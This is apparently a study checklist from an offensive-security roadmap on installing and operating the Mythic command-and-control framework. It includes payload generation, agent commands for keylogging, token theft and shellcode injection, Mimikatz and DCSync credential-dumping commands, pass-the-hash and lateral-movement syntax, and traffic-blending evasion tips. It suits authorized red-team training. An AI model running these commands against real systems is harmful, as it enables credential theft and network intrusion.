# 🏰 Mythic: Complete Mastery Checklist

> **What is Mythic?** Mythic is a modern, open-source Command & Control (C2) framework designed for offensive security operations and red team engagements. It provides a web-based operator interface, a scalable C2 server architecture, and a modular agent/payload system supporting multiple operating systems and communication protocols. Mythic is the next-generation replacement for older C2 frameworks — designed with a React-based UI, Docker-based deployment, and a plugin system for custom agents and communication channels ("C2 profiles").
>
> **Why does it exist?** Traditional C2 frameworks (Cobalt Strike, Metasploit) are either expensive, monolithic, or primarily designed for testing rather than realistic red team operations. Mythic was built for mature red team operations: it supports multi-operator collaboration, real-time task delegation, detailed logging for deconfliction, and a plugin architecture (agents, C2 profiles) that allows custom implants and novel communication channels for bypass of modern security controls.
>
> **When to use it:** Phase 10 advanced red team operations, simulating sophisticated APT tradecraft with custom implants, C2 infrastructure operations requiring operator collaboration, and learning C2 framework architecture for defensive purposes (understanding what to detect).
>
> **When to avoid it:** Mythic is a fully-featured offensive tool — only use in authorized red team engagements and labs. Never deploy Mythic C2 infrastructure on production networks without explicit authorization. For simpler engagements, Metasploit or Sliver may be more appropriate.
>
> **What mastering Mythic unlocks:** Advanced C2 operations capability, understanding of modern post-exploitation tradecraft, multi-operator red team coordination skills, and the Phase 10 exit gate for sophisticated red team operations.
>
> **Roadmap Stage / Module:** Stage 5: Module 29 (Red Team Operations & Tradecraft)

---

## 🧭 Navigation

> [🏠 Master Roadmap](../README.md) · [🔧 Tools Index](README.md)

| C2 Frameworks | Post-Exploitation | Offensive Tooling |
|:-------------|:----------------|:-----------------|
| **🏰 Mythic** (you are here) | [🔱 Sliver](Sliver.md) | [💉 Metasploit](Metasploit_Framework.md) |
| [⚔️ Havoc](Havoc.md) | [🔧 Impacket](Impacket.md) | [🩸 BloodHound](BloodHound.md) |

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Installation & Architecture | 6 | 2–3 hours |
| 2 | Web Interface & Operator Workflow | 7 | 3–4 hours |
| 3 | Agents — Apollo & Poseidon | 7 | 4–5 hours |
| 4 | C2 Profiles & Communication | 6 | 3–4 hours |
| 5 | Post-Exploitation Modules | 8 | 4–5 hours |
| 6 | Red Team Operations Workflow | 5 | 3–4 hours |
| 7 | Practical Labs | 4 | 5–8 hours |
| | **Total** | **43** | **~24–33 hours** |

**Prerequisites:** Phase 2 complete (Metasploit, basic C2 concepts). Phase 6 active directory exploitation. Linux server administration (Docker). Understanding of what C2 is and why it's needed.

---

# PHASE 1: INSTALLATION & ARCHITECTURE

---

## 1.1 Mythic Architecture

```
Mythic Server (Docker Compose)
├── mythic_server         — Core C2 server (Go)
├── mythic_ui             — React-based operator web interface
├── mythic_postgres       — PostgreSQL database (operations data)
├── mythic_rabbitmq       — RabbitMQ message bus (agent communication)
├── mythic_nginx          — NGINX reverse proxy (HTTPS)
└── [Agent containers]    — Each agent type is its own Docker container
    ├── apollo            — Windows agent (C#)
    ├── poseidon          — Linux/macOS agent (Go)
    └── [custom agents]   — You can write your own

Communication flow:
Implant → C2 Profile Container → RabbitMQ → Mythic Server → Operator UI
```

## 1.2 Installation

```bash
# Prerequisites: Docker, Docker Compose, Git
sudo apt install docker.io docker-compose git

# Clone Mythic
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic

# Start Mythic (first run takes 5-10 minutes for Docker pulls)
sudo ./mythic-cli start

# Check status
sudo ./mythic-cli status

# Get default admin credentials
sudo ./mythic-cli config get | grep -i "pass\|user"
# Default: mythic_admin / mythic_password (CHANGE IMMEDIATELY)
```

## 1.3 Adding Agents and C2 Profiles

```bash
# List available agents (from Mythic's agent library)
sudo ./mythic-cli install github https://github.com/MythicAgents/apollo    # Windows agent (C#)
sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon  # Linux/macOS agent (Go)
sudo ./mythic-cli install github https://github.com/MythicAgents/medusa    # Cross-platform (Python)

# Install C2 profiles (communication channels)
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http  # HTTP/HTTPS C2
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/dns   # DNS C2
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/smb   # SMB named pipe C2

# Restart after installing agents
sudo ./mythic-cli restart
```

## 1.4 Initial Setup

```bash
# Access the UI
# Navigate to: https://<your-server-ip>
# Default port: 7443 (HTTPS)

# Login: mythic_admin / mythic_password
# IMPORTANT: Change password immediately in Settings → User Management
```

---

# PHASE 2: WEB INTERFACE & OPERATOR WORKFLOW

---

## 2.1 UI Layout

```
Mythic UI Navigation:
├── Callbacks          — Active compromised hosts (live sessions)
├── Payloads           — Generated implant files ready for delivery
├── Files              — File browser for downloads/uploads
├── Artifacts          — All artifacts created by tasks (screenshots, keylogger data)
├── Credentials        — Harvested credentials
├── Keylogs            — Keylogger output
├── Search             — Search across all operations data
├── C2 Profiles        — Active communication channel configurations
├── Operations         — Multi-operator workspace management
├── MITRE ATT&CK       — ATT&CK matrix view of your operation's coverage
└── Event Log          — All operator actions (for deconfliction and reporting)
```

## 2.2 Creating an Operator Account

```bash
# In UI: Settings → User Management → Add User
# OR via CLI:
sudo ./mythic-cli user create
# Follow prompts for username, password, role (operator vs admin)
```

## 2.3 Creating a New Operation

1. UI → Hamburger menu → Operations → Create Operation
2. Set operation name, admin, and visible to operators
3. All callbacks, tasks, credentials, etc. are scoped to an operation

---

# PHASE 3: AGENTS — APOLLO & POSEIDON

---

## 3.1 Generating a Payload

```
1. UI → Payloads → New Payload
2. Select target OS (Windows/Linux/macOS)
3. Select agent (Apollo for Windows, Poseidon for Linux/macOS)
4. Select C2 Profile (HTTP is easiest to start with)
5. Configure C2 parameters:
   - Callback Host: https://your.c2.server
   - Callback Port: 443
   - Callback Interval: 10 (seconds between check-ins)
   - Callback Jitter: 30 (±30% interval randomization for evasion)
   - Kill Date: Set an expiry for the implant
6. Configure output format:
   - Windows: exe, dll, donut shellcode, PowerShell base64
   - Linux: elf binary, Python script
7. Download the generated payload file
```

## 3.2 Apollo (Windows C# Agent) — Key Commands

Once a callback appears (victim executed your payload):

```
# In Callback UI — Task Commands:
shell whoami           # Execute cmd.exe shell command
powershell Get-Process # Execute PowerShell
ls                     # List directory
cd C:\Users            # Change directory
upload /tmp/file.exe   # Upload file to target
download C:\Users\victim\Documents\passwords.txt  # Download file
screenshot             # Take screenshot
keylog_start           # Start keylogger
keylog_stop            # Stop keylogger
ps                     # List processes
inject <pid> <shellcode>  # Inject shellcode into process
spawn <path>           # Spawn a new process
mimikatz <command>     # Run Mimikatz (if loaded)
token_steal            # Steal/impersonate a process token
socks5 start 1080      # Start SOCKS5 proxy through this callback
exit                   # Kill the callback
```

## 3.3 Poseidon (Linux/macOS Go Agent) — Key Commands

```
shell id               # Execute shell command
ls                     # List directory
upload /local/file /remote/path  # Upload
download /remote/path  # Download
ps                     # Process list
socks5 start 1080      # SOCKS5 proxy
getenv                 # Get environment variables
exit                   # Kill callback
```

---

# PHASE 4: C2 PROFILES & COMMUNICATION

---

## 4.1 HTTP C2 Profile Configuration

```yaml
# HTTP C2 Profile parameters (configured during payload creation):
callback_host: "https://your.domain.com"
callback_port: 443
callback_interval: 10              # Check-in every 10 seconds
callback_jitter: 30                # ± 30% jitter
headers:
  User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  Accept-Language: "en-US,en;q=0.5"
get_uri: "/jquery-3.3.1.min.js"   # Blends in as jQuery requests
post_uri: "/jquery-3.3.1.min.js"
proxy_host: ""
proxy_port: ""
```

## 4.2 DNS C2 Profile

DNS-based C2 is the most covert — beacons via DNS queries that appear as normal DNS traffic:

```
# DNS C2 requires:
# 1. A domain you control
# 2. NS records pointing to your Mythic server
# DNS queries from the implant resolve via your NS server → Mythic C2

# Configuration:
domain: "cdn.yourdomain.com"
server: "mythic-server-ip:53"     # Your Mythic server must accept DNS on port 53
```

## 4.3 SMB C2 Profile (Lateral Movement)

SMB named-pipe C2 doesn't require internet connectivity — callbacks go through a pivot host:

```
# Parent callback → spawns child with SMB C2 profile
# Child communicates via named pipe to parent → parent relays to Mythic

# Usage: Pivot into air-gapped segments via a compromised host with internet access
```

---

# PHASE 5: POST-EXPLOITATION MODULES

---

## 5.1 Credential Harvesting

```
# Run Mimikatz commands through Apollo (if loaded):
mimikatz sekurlsa::logonpasswords    # Dump LSASS credentials
mimikatz sekurlsa::wdigest            # WDigest plaintext (requires pre-Windows 10)
mimikatz lsadump::sam                 # SAM database dump
mimikatz lsadump::dcsync /user:administrator  # DCSync attack

# Without Mimikatz DLL (safer, less detected):
# Use Apollo's built-in credential tasks:
dcsync /user:krbtgt       # DCSync for krbtgt hash
dumpvault                  # Dump Windows Credential Manager
```

## 5.2 Lateral Movement

```
# Pass-the-Hash via Apollo
pth /user:administrator /ntlm:NTLM_HASH_HERE /host:TARGET_HOST
    
# Pass-the-Ticket (inject a Kerberos ticket)
# First get a TGT:
# run Rubeus or get_injection with a ticket

# Spawn a new callback on a lateral host via SMB/WMI/DCOM
spawn_to wmi://TARGET_HOST      # WMI process creation
spawn_to smb://TARGET_HOST      # SMB lateral movement
spawn_to dcom://TARGET_HOST     # DCOM lateral movement
```

## 5.3 Pivoting (SOCKS5 Proxy)

```
# Enable SOCKS5 proxy through a callback
socks5 start 1080

# Now route attack tools through the SOCKS5 proxy:
# proxychains nmap -sT -p 80,443,445 10.10.10.0/24
# proxychains bloodhound-python -d domain.local -u user -p pass -dc DC01

# Port forwarding
port_forward start 8080 10.10.10.1 80  # Forward local 8080 → internal 10.10.10.1:80
```

---

# PHASE 6: RED TEAM OPERATIONS WORKFLOW

---

## 6.1 Operation Planning in Mythic

```
1. PRE-OPERATION:
   - Create operation in Mythic (scope, team, objectives)
   - Build payloads for each target phase (initial access, persistence, escalation)
   - Prepare C2 infrastructure (domain fronting, redirectors, valid TLS certs)

2. INITIAL ACCESS:
   - Deliver payload (phishing, web exploit, physical access)
   - Confirm callback appears in Mythic UI
   - Note: callback IP, hostname, username, privileges

3. RECONNAISSANCE:
   - Run host discovery: ps, whoami, ls, sysinfo
   - Run AD enumeration through proxy: BloodHound, nmap
   - Map network: socks5 + proxychains nmap

4. EXPLOITATION:
   - Privilege escalation (check BloodHound paths)
   - Credential harvesting (Mimikatz, DCSync)
   - Lateral movement (PtH, PtT, WMI, SMB)
   - Persistence (scheduled task, service, registry)

5. OBJECTIVE COMPLETION:
   - Access target system/data per scope
   - Document evidence (screenshots, file downloads)

6. CLEANUP:
   - Remove persistence mechanisms
   - Delete dropped files
   - Kill callbacks
   - Document all changes made for cleanup verification

7. REPORTING:
   - Export Mythic event log (all operator actions, timestamps)
   - Export MITRE ATT&CK coverage map
   - Write narrative report with evidence from Mythic artifacts
```

## 6.2 MITRE ATT&CK Tracking

Mythic automatically maps tasks to ATT&CK techniques. After an operation:
1. UI → MITRE ATT&CK tab
2. View which techniques were used
3. Export the ATT&CK matrix visualization for the report

---

# PHASE 7: PRACTICAL LABS

---

- [ ] **Lab 1 — Mythic Deployment:** Deploy Mythic on a VPS or local VM. Install Apollo (Windows agent) and the HTTP C2 profile. Access the UI, create an operator account, and create an operation. Confirm all services are running and accessible.

- [ ] **Lab 2 — First Callback:** Generate an Apollo payload targeting your lab Windows VM. Execute it on the target. Confirm the callback appears in Mythic. Run 10 basic commands (whoami, hostname, ps, ls, screenshot, getenv, etc.). Review all data in the Artifacts and Callbacks sections.

- [ ] **Lab 3 — Credential Harvesting Chain:** In your lab AD environment, get an initial callback on a domain workstation. Run host reconnaissance. Escalate to SYSTEM (if not already). Dump LSASS credentials via Mimikatz through Mythic. Use harvested credentials to authenticate to the domain controller. Document the full kill chain.

- [ ] **Lab 4 — Operation Report:** Run a 2-hour red team operation in your lab. Use Mythic as your C2. After the operation: export the event log, take screenshots of the MITRE ATT&CK coverage, and write a 3-page red team operation report covering: executive summary, attack narrative with timestamps, MITRE ATT&CK coverage, evidence, and impact assessment.

---

## 📝 Operational Notes

- **Mythic vs Cobalt Strike vs Sliver:** Cobalt Strike is the industry standard but costs $2,500+/year. Sliver is the best free alternative with mature features. Mythic is the most extensible (custom agent framework) and the best for learning C2 architecture. Know all three concepts; use Mythic + Sliver for learning/labs.
- **Operational Security (OPSEC):** Your C2 infrastructure is as important as the agent. Use domain fronting, legitimate TLS certificates, traffic blending (mimic real application traffic), and callbacks through redirectors (never direct from target to Mythic server). These are Phase 10 OPSEC considerations.
- **Agent detection:** Apollo and Poseidon are publicly known and have YARA rules, behavioral signatures, and EDR detections. For realistic red teams, you need custom agents or heavily modified versions. Understanding detection is key for defensive teams.
- **Database backup:** Mythic's operational data (credentials, callbacks, tasks) lives in PostgreSQL. Back up regularly during long engagements: `sudo ./mythic-cli database export`.
- **Legal requirement:** Never deploy Mythic outside a lab or authorized engagement. All evidence of C2 infrastructure is visible in network logs, and prosecutions have occurred over unauthorized C2 deployment.
